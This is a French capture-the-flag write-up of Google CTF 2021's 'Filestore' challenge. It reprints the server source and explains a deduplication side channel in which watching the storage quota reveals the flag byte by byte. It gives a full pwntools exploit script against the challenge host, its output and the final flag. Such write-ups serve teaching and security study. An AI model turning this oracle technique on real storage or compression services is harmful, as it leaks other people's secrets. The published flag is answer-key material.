---
layout: post
author: FPI
title: "Filestore - Google CTF 2021"
date: 2021-07-20
categories: [CTF, Misc]
background_image: assets/datacenter.jpg
title_color: "#ffffff"
---

Le flag est stocké dans un service de stockage personnalisé. Le service n'ajoute de nouvelles données à son disque que si elles n'y sont pas déjà contenues. Nous pouvons abuser les statistiques exposées pour savoir si les données ont été écrites sur le disque. Nous pouvons donc rechercher le flag octet par octet.

## Détails

- Catégorie : misc
- Points : 50
- Résolutions : 321

### Description

"We stored our flag on this platform, but forgot to save the id. Can you help us restore it ?"

`nc filestore.2021.ctfcompetition.com 1337`

Code source :

```python
# Copyright 2021 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import os, secrets, string, time
from flag import flag


def main():
    # It's a tiny server...
    blob = bytearray(2**16)
    files = {}
    used = 0

    # Use deduplication to save space.
    def store(data):
        nonlocal used
        MINIMUM_BLOCK = 16
        MAXIMUM_BLOCK = 1024
        part_list = []
        while data:
            prefix = data[:MINIMUM_BLOCK]
            ind = -1
            bestlen, bestind = 0, -1
            while True:
                ind = blob.find(prefix, ind+1)
                if ind == -1: break
                length = len(os.path.commonprefix([data, bytes(blob[ind:ind+MAXIMUM_BLOCK])]))
                if length > bestlen:
                    bestlen, bestind = length, ind

            if bestind != -1:
                part, data = data[:bestlen], data[bestlen:]
                part_list.append((bestind, bestlen))
            else:
                part, data = data[:MINIMUM_BLOCK], data[MINIMUM_BLOCK:]
                blob[used:used+len(part)] = part
                part_list.append((used, len(part)))
                used += len(part)
                assert used <= len(blob)

        fid = "".join(secrets.choice(string.ascii_letters+string.digits) for i in range(16))
        files[fid] = part_list
        return fid

    def load(fid):
        data = []
        for ind, length in files[fid]:
            data.append(blob[ind:ind+length])
        return b"".join(data)

    print("Welcome to our file storage solution.")

    # Store the flag as one of the files.
    store(bytes(flag, "utf-8"))

    while True:
        print()
        print("Menu:")
        print("- load")
        print("- store")
        print("- status")
        print("- exit")
        choice = input().strip().lower()
        if choice == "load":
            print("Send me the file id...")
            fid = input().strip()
            data = load(fid)
            print(data.decode())
        elif choice == "store":
            print("Send me a line of data...")
            data = input().strip()
            fid = store(bytes(data, "utf-8"))
            print("Stored! Here's your file id:")
            print(fid)
        elif choice == "status":
            print("User: ctfplayer")
            print("Time: %s" % time.asctime())
            kb = used / 1024.0
            kb_all = len(blob) / 1024.0
            print("Quota: %0.3fkB/%0.3fkB" % (kb, kb_all))
            print("Files: %d" % len(files))
        elif choice == "exit":
            break
        else:
            print("Nope.")
            break

try:
    main()
except Exception:
    print("Nope.")
time.sleep(1)
```

## Méthodologie

### Comprendre le problème

Le serveur nous permet de stocker du texte et de le récupérer plus tard en utilisant un ID. Nous pouvons également consulter certaines statistiques sur le serveur :

```
== proof-of-work: disabled ==
Welcome to our file storage solution.

Menu:
- load
- store
- status
- exit
store
Send me a line of data...
blabla
Stored! Here's your file id:
Ks6I04YIBEr55REQ

Menu:
- load
- store
- status
- exit
load
Send me the file id...
Ks6I04YIBEr55REQ
blabla

Menu:
- load
- store
- status
- exit
status
User: ctfplayer
Time: Sat Jul 31 14:31:57 2021
Quota: 0.032kB/64.000kB
Files: 2

Menu:
- load
- store
- status
- exit
exit
```

Lors de la connexion, le flag est stocké mais l'ID est inconnu. Nous devons trouver un moyen de récupérer l'ID ou d'exfiltrer directement le contenu du flag.

### Résoudre le problème

Un rapide coup d'œil au code source montre clairement qu'il ne sera pas possible de retrouver l'identifiant du flag, car il est généré de manière aléatoire :

```python
fid = "".join(secrets.choice(string.ascii_letters+string.digits) for i in range(16))
```

Nous devrons faire fuir le contenu du flag d'une manière ou d'une autre.

En examinant la fonction `store`, nous pouvons voir que le serveur essaie d'économiser de l'espace en découpant nos données en blocs de 16 octets et en essayant de pointer vers des blocs de données déjà existants lorsque cela est possible. Ceci permet au serveur d'économiser de l'espace et est comparable à la compression de données.

Le format du flag nous apprend que le flag commence par `CTF{`. Si nous stockons `CTF{`, ces données existent déjà, donc aucune donnée supplémentaire ne devrait être stockée sur le serveur, ce qui n'augmente pas l'espace utilisé du disque. Comme nous pouvons voir l'état du serveur, nous pouvons savoir si nos données d'entrée sont déjà stockées sur le serveur ou non :

```
Menu:
- load
- store
- status
- exit
status
User: ctfplayer
Time: Sat Jul 31 14:42:55 2021
Quota: 0.026kB/64.000kB
Files: 1

Menu:
- load
- store
- status
- exit
store
Send me a line of data...
CTF{
Stored! Here's your file id:
DWZGD9RyKEBQatBu

Menu:
- load
- store
- status
- exit
status
User: ctfplayer
Time: Sat Jul 31 14:43:05 2021
Quota: 0.026kB/64.000kB
Files: 2
```

Si le `Quota` ne change pas, cela signifie que nos données étaient déjà stockées sur le serveur, sinon elles ne l'étaient pas. Avec cela, nous pouvons récupérer le flag un octet à la fois.

C'est le même principe d'attaque que la [vulnérabilité CRIME](https://en.wikipedia.org/wiki/CRIME) qui affecte la compression des données dans des protocoles comme TLS.

### Implémentation de la solution

Le script complet de l'exploit est donné ci-dessous :

```python
from pwn import *
import string

def store(m):
    conn.sendline("store")
    conn.recvline()
    conn.sendline(m)
    conn.recvuntil("- exit\n")

def status():
    conn.sendline("status")
    conn.recvline()
    conn.recvline()
    quota = conn.recvline()
    conn.recvuntil("- exit\n")
    return quota

conn = remote("filestore.2021.ctfcompetition.com", 1337)
conn.recvuntil("- exit\n")

STATUS = status()
FLAG = "CTF{"
TEMP = FLAG
for _ in range(100):
    for e in string.printable:
        store(TEMP+e)
        q = status()
        if q == STATUS:
            FLAG += e
            TEMP += e
            if len(TEMP) > 15:
                TEMP = TEMP[1:]
            print(f"{FLAG=}")
            break
        else:
            STATUS = q

conn.close()
```

En l'exécutant, on obtient le flag petit à petit :

```
FLAG='CTF{C'
FLAG='CTF{CR'
FLAG='CTF{CR1'
FLAG='CTF{CR1M'
FLAG='CTF{CR1M3'
FLAG='CTF{CR1M3_'
FLAG='CTF{CR1M3_0'
FLAG='CTF{CR1M3_0f'
FLAG='CTF{CR1M3_0f_'
FLAG='CTF{CR1M3_0f_d'
FLAG='CTF{CR1M3_0f_d3'
FLAG='CTF{CR1M3_0f_d3d'
FLAG='CTF{CR1M3_0f_d3du'
FLAG='CTF{CR1M3_0f_d3dup'
FLAG='CTF{CR1M3_0f_d3dup1'
FLAG='CTF{CR1M3_0f_d3dup1i'
FLAG='CTF{CR1M3_0f_d3dup1ic'
FLAG='CTF{CR1M3_0f_d3dup1ic4'
FLAG='CTF{CR1M3_0f_d3dup1ic4t'
FLAG='CTF{CR1M3_0f_d3dup1ic4ti'
FLAG='CTF{CR1M3_0f_d3dup1ic4ti0'
FLAG='CTF{CR1M3_0f_d3dup1ic4ti0n'
FLAG='CTF{CR1M3_0f_d3dup1ic4ti0n}'
```

Flag : **CTF{CR1M3_0f_d3dup1ic4ti0n}**
